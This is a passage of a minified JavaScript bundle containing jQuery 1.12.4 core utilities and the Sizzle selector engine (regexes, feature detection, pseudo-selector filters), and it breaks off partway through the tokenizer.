! function s(r, a, l) {
    function c(t, e) {
        if (!a[t]) {
            if (!r[t]) {
                var i = "function" == typeof require && require;
                if (!e && i) return i(t, !0);
                if (u) return u(t, !0);
                var n = new Error("Cannot find module '" + t + "'");
                throw n.code = "MODULE_NOT_FOUND", n
            }
            var o = a[t] = {
                exports: {}
            };
            r[t][0].call(o.exports, function(e) {
                return c(r[t][1][e] || e)
            }, o, o.exports, s, r, a, l)
        }
        return a[t].exports
    }
    for (var u = "function" == typeof require && require, e = 0; e < l.length; e++) c(l[e]);
    return c
}({
    1: [
        function(e, t, i) {
            var n, o;
            n = "undefined" != typeof window ? window : this, o = function(C, e) {
                var d = [],
                    f = C.document,
                    u = d.slice,
                    m = d.concat,
                    a = d.push,
                    o = d.indexOf,
                    i = {},
                    t = i.toString,
                    g = i.hasOwnProperty,
                    v = {},
                    n = "1.12.4",
                    T = function(e, t) {
                        return new T.fn.init(e, t)
                    },
                    s = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
                    r = /^-ms-/,
                    l = /-([\da-z])/gi,
                    c = function(e, t) {
                        return t.toUpperCase()
                    };

                function h(e) {
                    var t = !!e && "length" in e && e.length,
                        i = T.type(e);
                    return "function" !== i && !T.isWindow(e) && ("array" === i || 0 === t || "number" == typeof t && 0 < t && t - 1 in e)
                }
                T.fn = T.prototype = {
                    jquery: n,
                    constructor: T,
                    selector: "",
                    length: 0,
                    toArray: function() {
                        return u.call(this)
                    },
                    get: function(e) {
                        return null != e ? e < 0 ? this[e + this.length] : this[e] : u.call(this)
                    },
                    pushStack: function(e) {
                        var t = T.merge(this.constructor(), e);
                        return t.prevObject = this, t.context = this.context, t
                    },
                    each: function(e) {
                        return T.each(this, e)
                    },
                    map: function(i) {
                        return this.pushStack(T.map(this, function(e, t) {
                            return i.call(e, t, e)
                        }))
                    },
                    slice: function() {
                        return this.pushStack(u.apply(this, arguments))
                    },
                    first: function() {
                        return this.eq(0)
                    },
                    last: function() {
                        return this.eq(-1)
                    },
                    eq: function(e) {
                        var t = this.length,
                            i = +e + (e < 0 ? t : 0);
                        return this.pushStack(0 <= i && i < t ? [this[i]] : [])
                    },
                    end: function() {
                        return this.prevObject || this.constructor()
                    },
                    push: a,
                    sort: d.sort,
                    splice: d.splice
                }, T.extend = T.fn.extend = function() {
                    var e, t, i, n, o, s, r = arguments[0] || {},
                        a = 1,
                        l = arguments.length,
                        c = !1;
                    for ("boolean" == typeof r && (c = r, r = arguments[a] || {}, a++), "object" == typeof r || T.isFunction(r) || (r = {}), a === l && (r = this, a--); a < l; a++)
                        if (null != (o = arguments[a]))
                            for (n in o) e = r[n], r !== (i = o[n]) && (c && i && (T.isPlainObject(i) || (t = T.isArray(i))) ? (s = t ? (t = !1, e && T.isArray(e) ? e : []) : e && T.isPlainObject(e) ? e : {}, r[n] = T.extend(c, s, i)) : void 0 !== i && (r[n] = i));
                    return r
                }, T.extend({
                    expando: "jQuery" + (n + Math.random()).replace(/\D/g, ""),
                    isReady: !0,
                    error: function(e) {
                        throw new Error(e)
                    },
                    noop: function() {},
                    isFunction: function(e) {
                        return "function" === T.type(e)
                    },
                    isArray: Array.isArray || function(e) {
                        return "array" === T.type(e)
                    },
                    isWindow: function(e) {
                        return null != e && e == e.window
                    },
                    isNumeric: function(e) {
                        var t = e && e.toString();
                        return !T.isArray(e) && 0 <= t - parseFloat(t) + 1
                    },
                    isEmptyObject: function(e) {
                        var t;
                        for (t in e) return !1;
                        return !0
                    },
                    isPlainObject: function(e) {
                        var t;
                        if (!e || "object" !== T.type(e) || e.nodeType || T.isWindow(e)) return !1;
                        try {
                            if (e.constructor && !g.call(e, "constructor") && !g.call(e.constructor.prototype, "isPrototypeOf")) return !1
                        } catch (e) {
                            return !1
                        }
                        if (!v.ownFirst)
                            for (t in e) return g.call(e, t);
                        for (t in e);
                        return void 0 === t || g.call(e, t)
                    },
                    type: function(e) {
                        return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? i[t.call(e)] || "object" : typeof e
                    },
                    globalEval: function(e) {
                        e && T.trim(e) && (C.execScript || function(e) {
                            C.eval.call(C, e)
                        })(e)
                    },
                    camelCase: function(e) {
                        return e.replace(r, "ms-").replace(l, c)
                    },
                    nodeName: function(e, t) {
                        return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
                    },
                    each: function(e, t) {
                        var i, n = 0;
                        if (h(e))
                            for (i = e.length; n < i && !1 !== t.call(e[n], n, e[n]); n++);
                        else
                            for (n in e)
                                if (!1 === t.call(e[n], n, e[n])) break; return e
                    },
                    trim: function(e) {
                        return null == e ? "" : (e + "").replace(s, "")
                    },
                    makeArray: function(e, t) {
                        var i = t || [];
                        return null != e && (h(Object(e)) ? T.merge(i, "string" == typeof e ? [e] : e) : a.call(i, e)), i
                    },
                    inArray: function(e, t, i) {
                        var n;
                        if (t) {
                            if (o) return o.call(t, e, i);
                            for (n = t.length, i = i ? i < 0 ? Math.max(0, n + i) : i : 0; i < n; i++)
                                if (i in t && t[i] === e) return i
                        }
                        return -1
                    },
                    merge: function(e, t) {
                        for (var i = +t.length, n = 0, o = e.length; n < i;) e[o++] = t[n++];
                        if (i != i)
                            for (; void 0 !== t[n];) e[o++] = t[n++];
                        return e.length = o, e
                    },
                    grep: function(e, t, i) {
                        for (var n = [], o = 0, s = e.length, r = !i; o < s; o++)!t(e[o], o) != r && n.push(e[o]);
                        return n
                    },
                    map: function(e, t, i) {
                        var n, o, s = 0,
                            r = [];
                        if (h(e))
                            for (n = e.length; s < n; s++) null != (o = t(e[s], s, i)) && r.push(o);
                        else
                            for (s in e) null != (o = t(e[s], s, i)) && r.push(o);
                        return m.apply([], r)
                    },
                    guid: 1,
                    proxy: function(e, t) {
                        var i, n, o;
                        return "string" == typeof t && (o = e[t], t = e, e = o), T.isFunction(e) ? (i = u.call(arguments, 2), (n = function() {
                            return e.apply(t || this, i.concat(u.call(arguments)))
                        }).guid = e.guid = e.guid || T.guid++, n) : void 0
                    },
                    now: function() {
                        return +new Date
                    },
                    support: v
                }), "function" == typeof Symbol && (T.fn[Symbol.iterator] = d[Symbol.iterator]), T.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function(e, t) {
                    i["[object " + t + "]"] = t.toLowerCase()
                });
                var p = function(i) {
                    var e, f, w, s, o, m, d, g, x, l, c, _, C, r, T, v, a, u, y, k = "sizzle" + 1 * new Date,
                        b = i.document,
                        $ = 0,
                        n = 0,
                        h = oe(),
                        p = oe(),
                        E = oe(),
                        S = function(e, t) {
                            return e === t && (c = !0), 0
                        },
                        A = {}.hasOwnProperty,
                        t = [],
                        D = t.pop,
                        j = t.push,
                        N = t.push,
                        L = t.slice,
                        z = function(e, t) {
                            for (var i = 0, n = e.length; i < n; i++)
                                if (e[i] === t) return i;
                            return -1
                        },
                        M = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
                        q = "[\\x20\\t\\r\\n\\f]",
                        P = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
                        O = "\\[" + q + "*(" + P + ")(?:" + q + "*([*^$|!~]?=)" + q + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + P + "))|)" + q + "*\\]",
                        F = ":(" + P + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + O + ")*)|.*)\\)|)",
                        H = new RegExp(q + "+", "g"),
                        B = new RegExp("^" + q + "+|((?:^|[^\\\\])(?:\\\\.)*)" + q + "+$", "g"),
                        I = new RegExp("^" + q + "*," + q + "*"),
                        R = new RegExp("^" + q + "*([>+~]|" + q + ")" + q + "*"),
                        W = new RegExp("=" + q + "*([^\\]'\"]*?)" + q + "*\\]", "g"),
                        V = new RegExp(F),
                        X = new RegExp("^" + P + "$"),
                        G = {
                            ID: new RegExp("^#(" + P + ")"),
                            CLASS: new RegExp("^\\.(" + P + ")"),
                            TAG: new RegExp("^(" + P + "|[*])"),
                            ATTR: new RegExp("^" + O),
                            PSEUDO: new RegExp("^" + F),
                            CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + q + "*(even|odd|(([+-]|)(\\d*)n|)" + q + "*(?:([+-]|)" + q + "*(\\d+)|))" + q + "*\\)|)", "i"),
                            bool: new RegExp("^(?:" + M + ")$", "i"),
                            needsContext: new RegExp("^" + q + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + q + "*((?:-\\d)?\\d*)" + q + "*\\)|)(?=[^-]|$)", "i")
                        },
                        U = /^(?:input|select|textarea|button)$/i,
                        Q = /^h\d$/i,
                        Y = /^[^{]+\{\s*\[native \w/,
                        J = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
                        Z = /[+~]/,
                        K = /'|\\/g,
                        ee = new RegExp("\\\\([\\da-f]{1,6}" + q + "?|(" + q + ")|.)", "ig"),
                        te = function(e, t, i) {
                            var n = "0x" + t - 65536;
                            return n != n || i ? t : n < 0 ? String.fromCharCode(65536 + n) : String.fromCharCode(n >> 10 | 55296, 1023 & n | 56320)
                        },
                        ie = function() {
                            _()
                        };
                    try {
                        N.apply(t = L.call(b.childNodes), b.childNodes), t[b.childNodes.length].nodeType
                    } catch (e) {
                        N = {
                            apply: t.length ? function(e, t) {
                                j.apply(e, L.call(t))
                            } : function(e, t) {
                                for (var i = e.length, n = 0; e[i++] = t[n++];);
                                e.length = i - 1
                            }
                        }
                    }

                    function ne(e, t, i, n) {
                        var o, s, r, a, l, c, u, d, h = t && t.ownerDocument,
                            p = t ? t.nodeType : 9;
                        if (i = i || [], "string" != typeof e || !e || 1 !== p && 9 !== p && 11 !== p) return i;
                        if (!n && ((t ? t.ownerDocument || t : b) !== C && _(t), t = t || C, T)) {
                            if (11 !== p && (c = J.exec(e)))
                                if (o = c[1]) {
                                    if (9 === p) {
                                        if (!(r = t.getElementById(o))) return i;
                                        if (r.id === o) return i.push(r), i
                                    } else if (h && (r = h.getElementById(o)) && y(t, r) && r.id === o) return i.push(r), i
                                } else {
                                    if (c[2]) return N.apply(i, t.getElementsByTagName(e)), i;
                                    if ((o = c[3]) && f.getElementsByClassName && t.getElementsByClassName) return N.apply(i, t.getElementsByClassName(o)), i
                                }
                            if (f.qsa && !E[e + " "] && (!v || !v.test(e))) {
                                if (1 !== p) h = t, d = e;
                                else if ("object" !== t.nodeName.toLowerCase()) {
                                    for ((a = t.getAttribute("id")) ? a = a.replace(K, "\\$&") : t.setAttribute("id", a = k), s = (u = m(e)).length, l = X.test(a) ? "#" + a : "[id='" + a + "']"; s--;) u[s] = l + " " + fe(u[s]);
                                    d = u.join(","), h = Z.test(e) && he(t.parentNode) || t
                                }
                                if (d) try {
                                    return N.apply(i, h.querySelectorAll(d)), i
                                } catch (e) {} finally {
                                    a === k && t.removeAttribute("id")
                                }
                            }
                        }
                        return g(e.replace(B, "$1"), t, i, n)
                    }

                    function oe() {
                        var n = [];
                        return function e(t, i) {
                            return n.push(t + " ") > w.cacheLength && delete e[n.shift()], e[t + " "] = i
                        }
                    }

                    function se(e) {
                        return e[k] = !0, e
                    }

                    function re(e) {
                        var t = C.createElement("div");
                        try {
                            return !!e(t)
                        } catch (e) {
                            return !1
                        } finally {
                            t.parentNode && t.parentNode.removeChild(t), t = null
                        }
                    }

                    function ae(e, t) {
                        for (var i = e.split("|"), n = i.length; n--;) w.attrHandle[i[n]] = t
                    }

                    function le(e, t) {
                        var i = t && e,
                            n = i && 1 === e.nodeType && 1 === t.nodeType && (~t.sourceIndex || 1 << 31) - (~e.sourceIndex || 1 << 31);
                        if (n) return n;
                        if (i)
                            for (; i = i.nextSibling;)
                                if (i === t) return -1;
                        return e ? 1 : -1
                    }

                    function ce(t) {
                        return function(e) {
                            return "input" === e.nodeName.toLowerCase() && e.type === t
                        }
                    }

                    function ue(i) {
                        return function(e) {
                            var t = e.nodeName.toLowerCase();
                            return ("input" === t || "button" === t) && e.type === i
                        }
                    }

                    function de(r) {
                        return se(function(s) {
                            return s = +s, se(function(e, t) {
                                for (var i, n = r([], e.length, s), o = n.length; o--;) e[i = n[o]] && (e[i] = !(t[i] = e[i]))
                            })
                        })
                    }

                    function he(e) {
                        return e && void 0 !== e.getElementsByTagName && e
                    }
                    for (e in f = ne.support = {}, o = ne.isXML = function(e) {
                        var t = e && (e.ownerDocument || e).documentElement;
                        return !!t && "HTML" !== t.nodeName
                    }, _ = ne.setDocument = function(e) {
                        var t, i, n = e ? e.ownerDocument || e : b;
                        return n !== C && 9 === n.nodeType && n.documentElement && (r = (C = n).documentElement, T = !o(C), (i = C.defaultView) && i.top !== i && (i.addEventListener ? i.addEventListener("unload", ie, !1) : i.attachEvent && i.attachEvent("onunload", ie)), f.attributes = re(function(e) {
                            return e.className = "i", !e.getAttribute("className")
                        }), f.getElementsByTagName = re(function(e) {
                            return e.appendChild(C.createComment("")), !e.getElementsByTagName("*").length
                        }), f.getElementsByClassName = Y.test(C.getElementsByClassName), f.getById = re(function(e) {
                            return r.appendChild(e).id = k, !C.getElementsByName || !C.getElementsByName(k).length
                        }), f.getById ? (w.find.ID = function(e, t) {
                            if (void 0 !== t.getElementById && T) {
                                var i = t.getElementById(e);
                                return i ? [i] : []
                            }
                        }, w.filter.ID = function(e) {
                            var t = e.replace(ee, te);
                            return function(e) {
                                return e.getAttribute("id") === t
                            }
                        }) : (delete w.find.ID, w.filter.ID = function(e) {
                            var i = e.replace(ee, te);
                            return function(e) {
                                var t = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
                                return t && t.value === i
                            }
                        }), w.find.TAG = f.getElementsByTagName ? function(e, t) {
                            return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : f.qsa ? t.querySelectorAll(e) : void 0
                        } : function(e, t) {
                            var i, n = [],
                                o = 0,
                                s = t.getElementsByTagName(e);
                            if ("*" !== e) return s;
                            for (; i = s[o++];) 1 === i.nodeType && n.push(i);
                            return n
                        }, w.find.CLASS = f.getElementsByClassName && function(e, t) {
                            return void 0 !== t.getElementsByClassName && T ? t.getElementsByClassName(e) : void 0
                        }, a = [], v = [], (f.qsa = Y.test(C.querySelectorAll)) && (re(function(e) {
                            r.appendChild(e).innerHTML = "<a id='" + k + "'></a><select id='" + k + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && v.push("[*^$]=" + q + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || v.push("\\[" + q + "*(?:value|" + M + ")"), e.querySelectorAll("[id~=" + k + "-]").length || v.push("~="), e.querySelectorAll(":checked").length || v.push(":checked"), e.querySelectorAll("a#" + k + "+*").length || v.push(".#.+[+~]")
                        }), re(function(e) {
                            var t = C.createElement("input");
                            t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && v.push("name" + q + "*[*^$|!~]?="), e.querySelectorAll(":enabled").length || v.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), v.push(",.*:")
                        })), (f.matchesSelector = Y.test(u = r.matches || r.webkitMatchesSelector || r.mozMatchesSelector || r.oMatchesSelector || r.msMatchesSelector)) && re(function(e) {
                            f.disconnectedMatch = u.call(e, "div"), u.call(e, "[s!='']:x"), a.push("!=", F)
                        }), v = v.length && new RegExp(v.join("|")), a = a.length && new RegExp(a.join("|")), t = Y.test(r.compareDocumentPosition), y = t || Y.test(r.contains) ? function(e, t) {
                            var i = 9 === e.nodeType ? e.documentElement : e,
                                n = t && t.parentNode;
                            return e === n || !(!n || 1 !== n.nodeType || !(i.contains ? i.contains(n) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(n)))
                        } : function(e, t) {
                            if (t)
                                for (; t = t.parentNode;)
                                    if (t === e) return !0;
                            return !1
                        }, S = t ? function(e, t) {
                            if (e === t) return c = !0, 0;
                            var i = !e.compareDocumentPosition - !t.compareDocumentPosition;
                            return i || (1 & (i = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !f.sortDetached && t.compareDocumentPosition(e) === i ? e === C || e.ownerDocument === b && y(b, e) ? -1 : t === C || t.ownerDocument === b && y(b, t) ? 1 : l ? z(l, e) - z(l, t) : 0 : 4 & i ? -1 : 1)
                        } : function(e, t) {
                            if (e === t) return c = !0, 0;
                            var i, n = 0,
                                o = e.parentNode,
                                s = t.parentNode,
                                r = [e],
                                a = [t];
                            if (!o || !s) return e === C ? -1 : t === C ? 1 : o ? -1 : s ? 1 : l ? z(l, e) - z(l, t) : 0;
                            if (o === s) return le(e, t);
                            for (i = e; i = i.parentNode;) r.unshift(i);
                            for (i = t; i = i.parentNode;) a.unshift(i);
                            for (; r[n] === a[n];) n++;
                            return n ? le(r[n], a[n]) : r[n] === b ? -1 : a[n] === b ? 1 : 0
                        }), C
                    }, ne.matches = function(e, t) {
                        return ne(e, null, null, t)
                    }, ne.matchesSelector = function(e, t) {
                        if ((e.ownerDocument || e) !== C && _(e), t = t.replace(W, "='$1']"), f.matchesSelector && T && !E[t + " "] && (!a || !a.test(t)) && (!v || !v.test(t))) try {
                            var i = u.call(e, t);
                            if (i || f.disconnectedMatch || e.document && 11 !== e.document.nodeType) return i
                        } catch (e) {}
                        return 0 < ne(t, C, null, [e]).length
                    }, ne.contains = function(e, t) {
                        return (e.ownerDocument || e) !== C && _(e), y(e, t)
                    }, ne.attr = function(e, t) {
                        (e.ownerDocument || e) !== C && _(e);
                        var i = w.attrHandle[t.toLowerCase()],
                            n = i && A.call(w.attrHandle, t.toLowerCase()) ? i(e, t, !T) : void 0;
                        return void 0 !== n ? n : f.attributes || !T ? e.getAttribute(t) : (n = e.getAttributeNode(t)) && n.specified ? n.value : null
                    }, ne.error = function(e) {
                        throw new Error("Syntax error, unrecognized expression: " + e)
                    }, ne.uniqueSort = function(e) {
                        var t, i = [],
                            n = 0,
                            o = 0;
                        if (c = !f.detectDuplicates, l = !f.sortStable && e.slice(0), e.sort(S), c) {
                            for (; t = e[o++];) t === e[o] && (n = i.push(o));
                            for (; n--;) e.splice(i[n], 1)
                        }
                        return l = null, e
                    }, s = ne.getText = function(e) {
                        var t, i = "",
                            n = 0,
                            o = e.nodeType;
                        if (o) {
                            if (1 === o || 9 === o || 11 === o) {
                                if ("string" == typeof e.textContent) return e.textContent;
                                for (e = e.firstChild; e; e = e.nextSibling) i += s(e)
                            } else if (3 === o || 4 === o) return e.nodeValue
                        } else
                            for (; t = e[n++];) i += s(t);
                        return i
                    }, (w = ne.selectors = {
                        cacheLength: 50,
                        createPseudo: se,
                        match: G,
                        attrHandle: {},
                        find: {},
                        relative: {
                            ">": {
                                dir: "parentNode",
                                first: !0
                            },
                            " ": {
                                dir: "parentNode"
                            },
                            "+": {
                                dir: "previousSibling",
                                first: !0
                            },
                            "~": {
                                dir: "previousSibling"
                            }
                        },
                        preFilter: {
                            ATTR: function(e) {
                                return e[1] = e[1].replace(ee, te), e[3] = (e[3] || e[4] || e[5] || "").replace(ee, te), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4)
                            },
                            CHILD: function(e) {
                                return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || ne.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && ne.error(e[0]), e
                            },
                            PSEUDO: function(e) {
                                var t, i = !e[6] && e[2];
                                return G.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : i && V.test(i) && (t = m(i, !0)) && (t = i.indexOf(")", i.length - t) - i.length) && (e[0] = e[0].slice(0, t), e[2] = i.slice(0, t)), e.slice(0, 3))
                            }
                        },
                        filter: {
                            TAG: function(e) {
                                var t = e.replace(ee, te).toLowerCase();
                                return "*" === e ? function() {
                                    return !0
                                } : function(e) {
                                    return e.nodeName && e.nodeName.toLowerCase() === t
                                }
                            },
                            CLASS: function(e) {
                                var t = h[e + " "];
                                return t || (t = new RegExp("(^|" + q + ")" + e + "(" + q + "|$)")) && h(e, function(e) {
                                    return t.test("string" == typeof e.className && e.className || void 0 !== e.getAttribute && e.getAttribute("class") || "")
                                })
                            },
                            ATTR: function(i, n, o) {
                                return function(e) {
                                    var t = ne.attr(e, i);
                                    return null == t ? "!=" === n : !n || (t += "", "=" === n ? t === o : "!=" === n ? t !== o : "^=" === n ? o && 0 === t.indexOf(o) : "*=" === n ? o && -1 < t.indexOf(o) : "$=" === n ? o && t.slice(-o.length) === o : "~=" === n ? -1 < (" " + t.replace(H, " ") + " ").indexOf(o) : "|=" === n && (t === o || t.slice(0, o.length + 1) === o + "-"))
                                }
                            },
                            CHILD: function(f, e, t, m, g) {
                                var v = "nth" !== f.slice(0, 3),
                                    y = "last" !== f.slice(-4),
                                    b = "of-type" === e;
                                return 1 === m && 0 === g ? function(e) {
                                    return !!e.parentNode
                                } : function(e, t, i) {
                                    var n, o, s, r, a, l, c = v != y ? "nextSibling" : "previousSibling",
                                        u = e.parentNode,
                                        d = b && e.nodeName.toLowerCase(),
                                        h = !i && !b,
                                        p = !1;
                                    if (u) {
                                        if (v) {
                                            for (; c;) {
                                                for (r = e; r = r[c];)
                                                    if (b ? r.nodeName.toLowerCase() === d : 1 === r.nodeType) return !1;
                                                l = c = "only" === f && !l && "nextSibling"
                                            }
                                            return !0
                                        }
                                        if (l = [y ? u.firstChild : u.lastChild], y && h) {
                                            for (p = (a = (n = (o = (s = (r = u)[k] || (r[k] = {}))[r.uniqueID] || (s[r.uniqueID] = {}))[f] || [])[0] === $ && n[1]) && n[2], r = a && u.childNodes[a]; r = ++a && r && r[c] || (p = a = 0) || l.pop();)
                                                if (1 === r.nodeType && ++p && r === e) {
                                                    o[f] = [$, a, p];
                                                    break
                                                }
                                        } else if (h && (p = a = (n = (o = (s = (r = e)[k] || (r[k] = {}))[r.uniqueID] || (s[r.uniqueID] = {}))[f] || [])[0] === $ && n[1]), !1 === p)
                                            for (;
                                                (r = ++a && r && r[c] || (p = a = 0) || l.pop()) && ((b ? r.nodeName.toLowerCase() !== d : 1 !== r.nodeType) || !++p || (h && ((o = (s = r[k] || (r[k] = {}))[r.uniqueID] || (s[r.uniqueID] = {}))[f] = [$, p]), r !== e)););
                                        return (p -= g) === m || p % m == 0 && 0 <= p / m
                                    }
                                }
                            },
                            PSEUDO: function(e, s) {
                                var t, r = w.pseudos[e] || w.setFilters[e.toLowerCase()] || ne.error("unsupported pseudo: " + e);
                                return r[k] ? r(s) : 1 < r.length ? (t = [e, e, "", s], w.setFilters.hasOwnProperty(e.toLowerCase()) ? se(function(e, t) {
                                    for (var i, n = r(e, s), o = n.length; o--;) e[i = z(e, n[o])] = !(t[i] = n[o])
                                }) : function(e) {
                                    return r(e, 0, t)
                                }) : r
                            }
                        },
                        pseudos: {
                            not: se(function(e) {
                                var n = [],
                                    o = [],
                                    a = d(e.replace(B, "$1"));
                                return a[k] ? se(function(e, t, i, n) {
                                    for (var o, s = a(e, null, n, []), r = e.length; r--;)(o = s[r]) && (e[r] = !(t[r] = o))
                                }) : function(e, t, i) {
                                    return n[0] = e, a(n, null, i, o), n[0] = null, !o.pop()
                                }
                            }),
                            has: se(function(t) {
                                return function(e) {
                                    return 0 < ne(t, e).length
                                }
                            }),
                            contains: se(function(t) {
                                return t = t.replace(ee, te),
                                    function(e) {
                                        return -1 < (e.textContent || e.innerText || s(e)).indexOf(t)
                                    }
                            }),
                            lang: se(function(i) {
                                return X.test(i || "") || ne.error("unsupported lang: " + i), i = i.replace(ee, te).toLowerCase(),
                                    function(e) {
                                        var t;
                                        do {
                                            if (t = T ? e.lang : e.getAttribute("xml:lang") || e.getAttribute("lang")) return (t = t.toLowerCase()) === i || 0 === t.indexOf(i + "-")
                                        } while ((e = e.parentNode) && 1 === e.nodeType);
                                        return !1
                                    }
                            }),
                            target: function(e) {
                                var t = i.location && i.location.hash;
                                return t && t.slice(1) === e.id
                            },
                            root: function(e) {
                                return e === r
                            },
                            focus: function(e) {
                                return e === C.activeElement && (!C.hasFocus || C.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                            },
                            enabled: function(e) {
                                return !1 === e.disabled
                            },
                            disabled: function(e) {
                                return !0 === e.disabled
                            },
                            checked: function(e) {
                                var t = e.nodeName.toLowerCase();
                                return "input" === t && !!e.checked || "option" === t && !!e.selected
                            },
                            selected: function(e) {
                                return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
                            },
                            empty: function(e) {
                                for (e = e.firstChild; e; e = e.nextSibling)
                                    if (e.nodeType < 6) return !1;
                                return !0
                            },
                            parent: function(e) {
                                return !w.pseudos.empty(e)
                            },
                            header: function(e) {
                                return Q.test(e.nodeName)
                            },
                            input: function(e) {
                                return U.test(e.nodeName)
                            },
                            button: function(e) {
                                var t = e.nodeName.toLowerCase();
                                return "input" === t && "button" === e.type || "button" === t
                            },
                            text: function(e) {
                                var t;
                                return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase())
                            },
                            first: de(function() {
                                return [0]
                            }),
                            last: de(function(e, t) {
                                return [t - 1]
                            }),
                            eq: de(function(e, t, i) {
                                return [i < 0 ? i + t : i]
                            }),
                            even: de(function(e, t) {
                                for (var i = 0; i < t; i += 2) e.push(i);
                                return e
                            }),
                            odd: de(function(e, t) {
                                for (var i = 1; i < t; i += 2) e.push(i);
                                return e
                            }),
                            lt: de(function(e, t, i) {
                                for (var n = i < 0 ? i + t : i; 0 <= --n;) e.push(n);
                                return e
                            }),
                            gt: de(function(e, t, i) {
                                for (var n = i < 0 ? i + t : i; ++n < t;) e.push(n);
                                return e
                            })
                        }
                    }).pseudos.nth = w.pseudos.eq, {
                        radio: !0,
                        checkbox: !0,
                        file: !0,
                        password: !0,
                        image: !0
                    }) w.pseudos[e] = ce(e);
                    for (e in {
                        submit: !0,
                        reset: !0
                    }) w.pseudos[e] = ue(e);

                    function pe() {}

                    function fe(e) {
                        for (var t = 0, i = e.length, n = ""; t < i; t++) n += e[t].value;
                        return n
                    }

                    function me(a, e, t) {
                        var l = e.dir,
                            c = t && "parentNode" === l,
                            u = n++;
                        return e.first ? function(e, t, i) {
                            for (; e = e[l];)
                                if (1 === e.nodeType || c) return a(e, t, i)
                        } : function(e, t, i) {
                            var n, o, s, r = [$, u];
                            if (i) {
                                for (; e = e[l];)
                                    if ((1 === e.nodeType || c) && a(e, t, i)) return !0
                            } else
                                for (; e = e[l];)
                                    if (1 === e.nodeType || c) {
                                        if ((n = (o = (s = e[k] || (e[k] = {}))[e.uniqueID] || (s[e.uniqueID] = {}))[l]) && n[0] === $ && n[1] === u) return r[2] = n[2];
                                        if ((o[l] = r)[2] = a(e, t, i)) return !0
                                    }
                        }
                    }

                    function ge(o) {
                        return 1 < o.length ? function(e, t, i) {
                            for (var n = o.length; n--;)
                                if (!o[n](e, t, i)) return !1;
                            return !0
                        } : o[0]
                    }

                    function ve(e, t, i, n, o) {
                        for (var s, r = [], a = 0, l = e.length, c = null != t; a < l; a++)(s = e[a]) && (i && !i(s, n, o) || (r.push(s), c && t.push(a)));
                        return r
                    }

                    function ye(p, f, m, g, v, e) {
                        return g && !g[k] && (g = ye(g)), v && !v[k] && (v = ye(v, e)), se(function(e, t, i, n) {
                            var o, s, r, a = [],
                                l = [],
                                c = t.length,
                                u = e || function(e, t, i) {
                                    for (var n = 0, o = t.length; n < o; n++) ne(e, t[n], i);
                                    return i
                                }(f || "*", i.nodeType ? [i] : i, []),
                                d = !p || !e && f ? u : ve(u, a, p, i, n),
                                h = m ? v || (e ? p : c || g) ? [] : t : d;
                            if (m && m(d, h, i, n), g)
                                for (o = ve(h, l), g(o, [], i, n), s = o.length; s--;)(r = o[s]) && (h[l[s]] = !(d[l[s]] = r));
                            if (e) {
                                if (v || p) {
                                    if (v) {
                                        for (o = [], s = h.length; s--;)(r = h[s]) && o.push(d[s] = r);
                                        v(null, h = [], o, n)
                                    }
                                    for (s = h.length; s--;)(r = h[s]) && -1 < (o = v ? z(e, r) : a[s]) && (e[o] = !(t[o] = r))
                                }
                            } else h = ve(h === t ? h.splice(c, h.length) : h), v ? v(null, t, h, n) : N.apply(t, h)
                        })
                    }

                    function be(e) {
                        for (var o, t, i, n = e.length, s = w.relative[e[0].type], r = s || w.relative[" "], a = s ? 1 : 0, l = me(function(e) {
                            return e === o
                        }, r, !0), c = me(function(e) {
                            return -1 < z(o, e)
                        }, r, !0), u = [
                            function(e, t, i) {
                                var n = !s && (i || t !== x) || ((o = t).nodeType ? l(e, t, i) : c(e, t, i));
                                return o = null, n
                            }
                        ]; a < n; a++)
                            if (t = w.relative[e[a].type]) u = [me(ge(u), t)];
                            else {
                                if ((t = w.filter[e[a].type].apply(null, e[a].matches))[k]) {
                                    for (i = ++a; i < n && !w.relative[e[i].type]; i++);
                                    return ye(1 < a && ge(u), 1 < a && fe(e.slice(0, a - 1).concat({
                                        value: " " === e[a - 2].type ? "*" : ""
                                    })).replace(B, "$1"), t, a < i && be(e.slice(a, i)), i < n && be(e = e.slice(i)), i < n && fe(e))
                                }
                                u.push(t)
                            }
                        return ge(u)
                    }
                    return pe.prototype = w.filters = w.pseudos, w.setFilters = new pe, m = ne.tokenize = function(e, t) {
                        var i, n, o, s, r, a, l, c = p[e + " "];
                        if (c) return t ? 0 : c.slice(0);
                        for (r = e, a = [], l = w.preFilter; r;) {
